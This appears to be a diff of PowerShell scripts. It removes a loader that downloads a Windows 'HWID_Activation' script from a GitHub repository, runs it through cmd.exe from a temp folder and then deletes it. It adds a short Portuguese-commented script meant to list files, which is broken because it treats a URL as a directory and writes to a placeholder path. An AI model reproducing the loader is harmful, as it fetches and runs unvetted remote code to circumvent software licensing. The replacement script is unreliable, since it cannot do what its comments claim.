@@ -1,34 +1,11 @@
-# # The following get.ps1 code is hosted on get.activated.win for massgrave.dev. For more info, please visit massgrave.dev.
+# Defina o diretório que você deseja listar
+$diretorio = "https://raw.githubusercontent.com/JKINFORMATICASHOP/ativador/master/MAS/Separate-Files-Version/Activators/HWID_Activation.cmd"
 
-$ErrorActionPreference = "Stop"
-# Enable TLSv1.2 for compatibility with older clients for current session
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+# Defina o caminho do arquivo de saída
+$arquivoSaida = "C:\Seu\Caminho\Aqui\lista_arquivos.txt"
 
-$DownloadURL1 = 'https://raw.githubusercontent.com/JKINFORMATICASHOP/ativador/master/MAS/Separate-Files-Version/Activators/HWID_Activation.cmd'
-$DownloadURL2 = 'https://raw.githubusercontent.com/JKINFORMATICASHOP/ativador/master/MAS/Separate-Files-Version/Activators/HWID_Activation.cmd'
+# Liste os arquivos e salve no arquivo de saída
+Get-ChildItem -Path $diretorio | Select-Object FullName | Out-File -FilePath $arquivoSaida
 
-$URLs = @($DownloadURL1, $DownloadURL2)
-$RandomURL1 = Get-Random -InputObject $URLs
-$RandomURL2 = ($URLs -ne $RandomURL1)[0]
-
-try {
-    $response = Invoke-WebRequest -Uri $RandomURL1 -UseBasicParsing
-}
-catch {
-    $response = Invoke-WebRequest -Uri $RandomURL2 -UseBasicParsing
-}
-
-$rand = [Guid]::NewGuid().Guid
-$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
-$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\MAS_$rand.cmd" } else { "$env:TEMP\MAS_$rand.cmd" }
-
-$ScriptArgs = "$args "
-$prefix = "@::: $rand `r`n"
-$content = $prefix + $response
-Set-Content -Path $FilePath -Value $content
-
-# Set ComSpec variable for current session in case its corrupt in the system
-$env:ComSpec = "$env:SystemRoot\system32\cmd.exe"
-Start-Process cmd.exe "/c """"$FilePath"" $ScriptArgs""" -Wait
-$FilePaths = @("$env:TEMP\MAS*.cmd", "$env:SystemRoot\Temp\MAS*.cmd")
-foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
+# Mensagem de conclusão
+Write-Host "A lista de arquivos foi salva em $arquivoSaida"
